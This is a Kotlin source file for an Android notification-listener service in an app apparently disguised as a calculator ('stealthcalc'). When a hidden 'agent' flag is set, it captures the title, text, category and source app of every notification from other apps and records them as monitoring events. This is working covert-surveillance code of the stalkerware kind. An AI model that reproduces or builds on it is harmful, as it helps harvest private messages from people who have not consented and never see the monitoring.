package com.stealthcalc.monitoring.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.MonitoringEventKind
import com.stealthcalc.monitoring.model.NotificationPayload
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@AndroidEntryPoint
class NotificationMonitorService : NotificationListenerService() {

    @Inject lateinit var repository: MonitoringRepository

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!repository.isAgent) return
        if (!repository.isMetricEnabled("notifications")) return
        if (sbn.packageName == packageName) return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString()
        val text = extras.getCharSequence("android.text")?.toString()
        val category = sbn.notification.category

        val appName = runCatching {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(sbn.packageName, 0)
            ).toString()
        }.getOrNull()

        scope.launch {
            runCatching {
                val payload = Json.encodeToString(
                    NotificationPayload(
                        packageName = sbn.packageName,
                        appName = appName,
                        title = title,
                        text = text,
                        category = category,
                        postedAt = sbn.postTime,
                    )
                )
                repository.recordEvent(MonitoringEventKind.NOTIFICATION, payload)
            }.onFailure { e ->
                AppLogger.log(this@NotificationMonitorService, "[agent]", "Notification capture error: ${e.message}")
            }
        }
    }
}
